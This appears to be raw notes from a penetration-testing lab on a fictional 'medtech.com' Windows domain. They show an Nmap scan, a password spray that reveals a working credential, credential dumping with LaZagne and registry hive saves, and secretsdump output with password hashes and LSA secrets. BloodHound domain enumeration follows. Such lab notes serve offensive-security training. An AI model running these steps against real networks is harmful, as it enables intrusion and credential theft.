#### Nmap
```bash
# Nmap 7.94SVN scan initiated Wed Jan 31 22:10:24 2024 as: nmap -p 135,139,445,5985,49664,49666,49667,49668 -sCV -A -T4 -O -oN 172.16.227.11/nmap/port-scan.nmap 172.16.227.11
Nmap scan report for 172.16.227.11
Host is up (0.020s latency).

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: FILES02, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:9e:f9:08 (VMware)
| smb2-time: 
|   date: 2024-01-31T21:11:23
|_  start_date: N/A

TRACEROUTE
HOP RTT      ADDRESS
1   20.49 ms 172.16.227.11

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jan 31 22:12:03 2024 -- 1 IP address (1 host up) scanned in 99.68 seconds
```

#### Password Spraying
```bash
# crackmapexec smb ../internal-network.txt -u joe -p 'Flowers1' -d medtech.com --continue-on-success
SMB         172.16.212.13   445    PROD01           [*] Windows 10.0 Build 20348 x64 (name:PROD01) (domain:medtech.com) (signing:False) (SMBv1:False)
SMB         172.16.212.10   445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:medtech.com) (signing:True) (SMBv1:False)
SMB         172.16.212.11   445    FILES02          [*] Windows 10.0 Build 20348 x64 (name:FILES02) (domain:medtech.com) (signing:False) (SMBv1:False)
SMB         172.16.212.83   445    CLIENT02         [*] Windows 10.0 Build 22000 x64 (name:CLIENT02) (domain:medtech.com) (signing:False) (SMBv1:False)
SMB         172.16.212.82   445    CLIENT01         [*] Windows 10.0 Build 22000 x64 (name:CLIENT01) (domain:medtech.com) (signing:False) (SMBv1:False)
SMB         172.16.212.12   445    DEV04            [*] Windows 10.0 Build 20348 x64 (name:DEV04) (domain:medtech.com) (signing:False) (SMBv1:False)
SMB         172.16.212.10   445    DC01             [+] medtech.com\joe:Flowers1 
SMB         172.16.212.11   445    FILES02          [+] medtech.com\joe:Flowers1 (Pwn3d!)
SMB         172.16.212.13   445    PROD01           [+] medtech.com\joe:Flowers1 
SMB         172.16.212.83   445    CLIENT02         [+] medtech.com\joe:Flowers1 
SMB         172.16.212.82   445    CLIENT01         [+] medtech.com\joe:Flowers1 
SMB         172.16.212.12   445    DEV04            [+] medtech.com\joe:Flowers1
```

#### Post Exploitation (Dump credentials with LaZagne and Attacking SAM)
```shell
*Evil-WinRM* PS C:\Users\joe\Desktop> .\LaZagne.exe all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

[+] System masterkey decrypted for 28ae257f-3818-40f4-8cea-9a07eac10f59
[+] System masterkey decrypted for 4d9f4654-a00b-4631-b36d-70dc450e9419
[+] System masterkey decrypted for f5f0c322-b3da-430a-85f7-4e7d41e19924

########## User: SYSTEM ##########

------------------- Hashdump passwords -----------------

Administrator:500:aad3b435b51404eeaad3b435b51404ee:f1014ac49bae005ee3ece5f47547d185:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:0c6ce171c9cc3afb29ca0ccc335e49bb:::

------------------- Pypykatz passwords -----------------

[+] Shahash found !!!
Shahash: 51f7f5c73f867508f2c41b255f97eb286ce9c4fe
Nthash: cd0334906c90537dcb2626aa294bd901
Login: FILES02$

[+] Shahash found !!!
Shahash: 5e95d6c43e70e142df33af3b50ab0baa6ca02bad
Nthash: f1014ac49bae005ee3ece5f47547d185
Login: Administrator

------------------- Lsa_secrets passwords -----------------

$MACHINE.ACC
0000   F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0010   ED 04 C6 D2 48 57 E5 61 1F 0E 0C B1 9A F0 7A 6D    ....HW.a......zm
0020   21 5F 55 57 19 55 40 81 6E C5 FB 40 A6 9D 32 06    !_UW.U@.n..@..2.
0030   EA 74 0A CB 72 1A 04 A2 30 8B 7B D0 E8 13 AD 6D    .t..r...0.{....m
0040   E8 86 64 8B C4 8A EC 93 65 07 0D FB C7 B7 61 90    ..d.....e.....a.
0050   5E A8 81 03 C9 89 DC 24 62 5B FF 2A E5 A7 0F 8D    ^......$b[.*....
0060   BF C2 2A F0 6B 23 E0 92 6E 44 16 07 FA 9B B8 EF    ..*.k#..nD......
0070   9B 4F C1 F9 B0 C9 BD DF 29 A3 5F 07 17 71 6D 06    .O......)._..qm.
0080   02 C2 5C ED 20 FD 03 67 8C 91 DA DA 42 EB FD 4F    .... ..g....B..O
0090   44 EB 31 6E 26 A0 0B 49 1C 2F B7 E7 96 5D 38 5C    D.1n&..I./...]8.
00A0   7A 1B 2E 10 F0 D8 67 C8 3F AC 33 D3 E8 90 1C C0    z.....g.?.3.....
00B0   2D 66 83 B2 93 B8 2D E6 99 31 78 4F DA EE DC 4C    -f....-..1xO...L
00C0   2D 75 EC 08 1B 9E 64 52 5D C3 89 0E 25 53 E6 C0    -u....dR]...%S..
00D0   00 F2 6A CB ED BD BB 91 FB 36 D3 1C A5 E1 4D 44    ..j......6....MD
00E0   F3 65 39 70 B2 00 AE 62 08 13 C4 65 0F AC 95 3D    .e9p...b...e...=
00F0   6A 93 56 25 C2 D7 80 DE 87 0A FE 19 4E 69 8C 0D    j.V%........Ni..
0100   33 26 34 F1 5B 3C DB A0 BB 7C A1 8D 7F A9 CD 33    3&4.[<...|.....3

DefaultPassword
0000   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0010   89 A9 BB 47 FC E5 BC 94 D5 4E 61 7E 17 C0 5A B2    ...G.....Na~..Z.

DPAPI_SYSTEM
0000   01 00 00 00 8B ED 59 6D 11 0C 49 AB 7A 63 06 03    ......Ym..I.zc..
0010   5A 48 13 1D BE 10 4C CE 18 11 C0 1D 68 68 B0 24    ZH....L.....hh.$
0020   10 B5 C1 78 8D 5A F1 AF E4 C8 3B 21                ...x.Z....;!

NL$KM
0000   40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    @...............
0010   C3 AB 94 BE FA CB 08 8C 46 FA 4E F3 28 95 F4 D7    ........F.N.(...
0020   B7 9F 6B 0B CD 94 9E 8A 4F 44 ED 1B E2 7F 1C 05    ..k.....OD......
0030   65 2D D1 64 7B 85 1F 78 D3 0F A3 4D 4B 21 4E DB    e-.d{..x...MK!N.
0040   B8 96 7A 7C 3A AD 4B 7C FE 85 26 3A EE 7D 54 C3    ..z|:.K|..&:.}T.
0050   78 A9 1F 33 56 32 86 71 84 2B 32 28 4B 0E 13 23    x..3V2.q.+2(K..#


[+] 5e95d6c43e70e142df33af3b50ab0baa6ca02bad ok for masterkey 37f94ad0-3562-4d91-abdc-f0fbfb8a88f8
[+] 5e95d6c43e70e142df33af3b50ab0baa6ca02bad ok for masterkey 9d9209e1-dee0-42fd-9e54-ffdb15f14bfd
[+] 5e95d6c43e70e142df33af3b50ab0baa6ca02bad ok for masterkey b2d2f200-3bb0-43ab-b945-72fabae457fc

[+] 2 passwords have been found.
For more information launch it again with the -v option

elapsed time = 7.453276872634888
```

```bash
*Evil-WinRM* PS C:\> reg.exe save hklm\sam C:\sam.save
The operation completed successfully.

*Evil-WinRM* PS C:\> reg.exe save hklm\system C:\system.save
The operation completed successfully.

*Evil-WinRM* PS C:\> reg.exe save hklm\security C:\security.save
The operation completed successfully.

------- 

impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Target system bootKey: 0x9ee80337b5848e02903e9c792b816b42
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f1014ac49bae005ee3ece5f47547d185:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:0c6ce171c9cc3afb29ca0ccc335e49bb:::
[*] Dumping cached domain logon information (domain/username:hash)
MEDTECH.COM/Administrator:$DCC2$10240#Administrator#a7c5480e8c1ef0ffec54e99275e6e0f7: (2022-10-18 14:29:00)
MEDTECH.COM/yoshi:$DCC2$10240#yoshi#cd21be418f01f5591ac8df1fdeaa54b6: (2022-09-28 10:52:28)
MEDTECH.COM/wario:$DCC2$10240#wario#b82706aff8acf56b6c325a6c2d8c338a: (2022-11-15 09:43:35)
MEDTECH.COM/joe:$DCC2$10240#joe#464f388c3fe52a0fa0a6c8926d62059c: (2022-11-11 10:09:23)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:ed04c6d24857e5611f0e0cb19af07a6d215f5557195540816ec5fb40a69d3206ea740acb721a04a2308b7bd0e813ad6de886648bc48aec9365070dfbc7b761905ea88103c989dc24625bff2ae5a70f8dbfc22af06b23e0926e441607fa9bb8ef9b4fc1f9b0c9bddf29a35f0717716d0602c25ced20fd03678c91dada42ebfd4f44eb316e26a00b491c2fb7e7965d385c7a1b2e10f0d867c83fac33d3e8901cc02d6683b293b82de69931784fdaeedc4c2d75ec081b9e64525dc3890e2553e6c000f26acbedbdbb91fb36d31ca5e14d44f3653970b200ae620813c4650fac953d6a935625c2d780de870afe194e698c0d
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:cd0334906c90537dcb2626aa294bd901
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x8bed596d110c49ab7a6306035a48131dbe104cce
dpapi_userkey:0x1811c01d6868b02410b5c1788d5af1afe4c83b21
[*] NL$KM 
 0000   C3 AB 94 BE FA CB 08 8C  46 FA 4E F3 28 95 F4 D7   ........F.N.(...
 0010   B7 9F 6B 0B CD 94 9E 8A  4F 44 ED 1B E2 7F 1C 05   ..k.....OD......
 0020   65 2D D1 64 7B 85 1F 78  D3 0F A3 4D 4B 21 4E DB   e-.d{..x...MK!N.
 0030   B8 96 7A 7C 3A AD 4B 7C  FE 85 26 3A EE 7D 54 C3   ..z|:.K|..&:.}T.
NL$KM:c3ab94befacb088c46fa4ef32895f4d7b79f6b0bcd949e8a4f44ed1be27f1c05652dd1647b851f78d30fa34d4b214edbb8967a7c3aad4b7cfe85263aee7d54c3
```

```bash
bloodhound-python -u 'joe' -p 'Flowers1' -ns 172.16.212.10 -d medtech.com -c all
INFO: Found AD domain: medtech.com
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.medtech.com:88)] [Errno 111] Connection refused
INFO: Connecting to LDAP server: dc01.medtech.com
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 7 computers
INFO: Connecting to LDAP server: dc01.medtech.com
INFO: Found 11 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: WEB02.dmz.medtech.com
INFO: Querying computer: CLIENT02.medtech.com
INFO: Querying computer: PROD01.medtech.com
INFO: Querying computer: CLIENT01.medtech.com
INFO: Querying computer: DEV04.medtech.com
INFO: Querying computer: FILES02.medtech.com
INFO: Querying computer: DC01.medtech.com
INFO: Done in 00M 07S
```